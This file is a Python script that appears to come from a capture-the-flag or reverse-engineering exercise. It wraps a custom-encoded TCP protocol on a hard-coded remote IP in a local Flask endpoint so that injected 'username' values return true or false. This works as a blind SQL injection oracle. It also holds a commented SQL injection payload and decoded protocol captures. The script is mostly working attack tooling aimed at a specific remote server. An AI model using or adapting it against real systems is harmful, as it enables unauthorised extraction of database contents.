import socket
from flask import Flask, request

def enc(data):
    prefix = '36DDE8D2F7A5D7D2AC38B3B6B1FCB1C3B4D3392038B3B6B1FCB1C3B4D339222122272224222822272222222622242220222123522420255355512938B3B6B1FCB1C3B4D339'
    suffix = '38B3B6B1FCB1C3B4D3393737373737373738B3B6B1FCB1C3B4D33925242421252020202220262722232626232326222625222622262621C23D0A2B6'
    table = {' ': '30', '!': '31', '"': '32', '#': '33', '$': '34', '%': '35', '&': '36', "'": '37', '(': '38', ')': '39', '*': '3A', '+': '3B', ',': '3C', '-': '3D', '.': '3E', '/': '3F', '0': '20', '1': '21', '2': '22', '3': '23', '4': '24', '5': '25', '6': '26', '7': '27', '8': '28', '9': '29', ':': '2A', ';': '2B', '<': '2C', '=': '2D', '>': '2E', '?': '2F', '@': '50', 'A': '51', 'B': '52', 'C': '53', 'D': '54', 'E': '55', 'F': '56', 'G': '57', 'H': '58', 'I': '59', 'J': '5A', 'K': '5B', 'L': '5C', 'M': '5D', 'N': '5E', 'O': '5F', 'P': '40', 'Q': '41', 'R': '42', 'S': '43', 'T': '44', 'U': '45', 'V': '46', 'W': '47', 'X': '48', 'Y': '49', 'Z': '4A', '[': '4B', '\\': '4C', ']': '4D', '^': '4E', '_': '4F', '`': '70', 'a': '71', 'b': '72', 'c': '73', 'd': '74', 'e': '75', 'f': '76', 'g': '77', 'h': '78', 'i': '79', 'j': '7A', 'k': '7B', 'l': '7C', 'm': '7D', 'n': '7E', 'o': '7F', 'p': '60', 'q': '61', 'r': '62', 's': '63', 't': '64', 'u': '65', 'v': '66', 'w': '67', 'x': '68', 'y': '69', 'z': '6A', '{': '6B', '|': '6C', '}': '6D', '~': '6E'}
    tmp = ''
    for d in data:
        tmp += table[d]
    return (prefix + tmp + suffix).encode('ascii')

def parse_ret(data):
    if b'D3CCD2FBA4FDDEE3B3B14' in data:
        return True
    else:
        return False

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('42.192.194.16', 5566))

# s.send(enc("admin' and 1=1 and 1 in (1,2,3,4)  and '1'='1"))
# print(parse_ret(s.recv(1024)))

app = Flask(__name__)

@app.route('/')
def hello_world():
    return "Hi"

@app.route('/test')
def test():
    arg = request.args.get('username')
    s.send(enc(arg))
    if parse_ret(s.recv(1024)):
        return "True"
    else:
        return "False"

app.run('127.0.0.1', 9999)
# line = '303132333435363738393A3B3C3D3E3F202122232425262728292A2B2C2D2E2F505152535455565758595A5B5C5D5E5F404142434445464748494A4B4C4D4E4F707172737475767778797A7B7C7D7E7F606162636465666768696A6B6C6D6E'
# n = 2
# t_list = [line[i:i+n] for i in range(0, len(line), n)]
# table = {}

# for i in range(32, 127):
#     # print(str(i) + ':' + chr(i), end=' ')
#     table[chr(i)] = t_list[i-32]
# print(table)

'''i
spliter = 38B3B6B1FCB1C3B4D339

78 64 64 60 63 2A 3F 3F 67 67 71 3E 7C 71 7E 6A 7F 65 79 3E 73 7F 7D 3F 79 24 40 7F 46 66 22 79 7B 26 78 4B 71 4D C5 F6 4B 71 4D 38 B3 B6 B1 FC B1 C3 B4 D3 39 4B 34 4D 22 20 22 21 D4 FA 21 20 C4 D2 28 D8 C5 21 29 DA A1 23 20 A7 C6 21 24 D3 FB C2 3D 0A 2B 6
h  T  T  P  S  :  /  /  W  W  a  .  l  a  n  Z  o  U  i  .  c  o  m  /  i  4  p  o  V  v  2  i  k  6  h  ;  a  =  ?  ?  ;  a  =  H  ?  ?  ?  ?  ?  ?  ?  ?  I  ;  D  ;  2  0  2  1  ?  ?  1  0  ?  ?  8  ?  ?  1  9  ?  ?  3  0  ?  ?  1  4  ?  ?  ?  -  ?  ;   

':' == 3A ----ENC---> 2A
'a' == 61 ----ENC---> 71


36 23 22 26 38 B3 B6 B1 FC B1 C3 B4 D3 39 AB EA 30 D6 E7 30 D2 FB 30 B1 BA 30 DD F2 C3 D3 4B 71 4D 22 3E 28 3E 22 4B 71 4D 78 64 64 60 63 2A 3F 3F 67 67 71 3E7C717E6A7F65793E737F7D3F7924407F466622797B26784B714DC5F64B714D38B3B6B1FCB1C3B4D3394B344D22202221D4FA2120C4D228D8C52129DAA12320A7C62124D3FBC23D0A2B6
F  3  2  6  H  ?  ?  ?  ?  ?  ?  ?  ?  I  ?  ?  @  ?  ?  @  ?  ?  @  ?  ?  @  ?  ?  ?  ?  ;  a  =  2  .  8  .  2  ;  a  =  h  


D3CCD2FBA4FDDEE3B3B14
36DDE8D2F7A5D7D2AD38B3B6B1FCB1C3B4D339D3CCD2FBA4FDDEE3B3B14B344D22202221D4FA2120C4D228D8C52221DAA12128A7C62224D3FBC23D0A2B6 //true
36DDE8D2F7A5D7D2AD38B3B6B1FCB1C3B4D339C5DBAAD5A2ABA4F6C4CA4B344D22202221D4FA2120C4D228D8C52221DAA12128A7C62327D3FBC23D0A2B6 //false


'''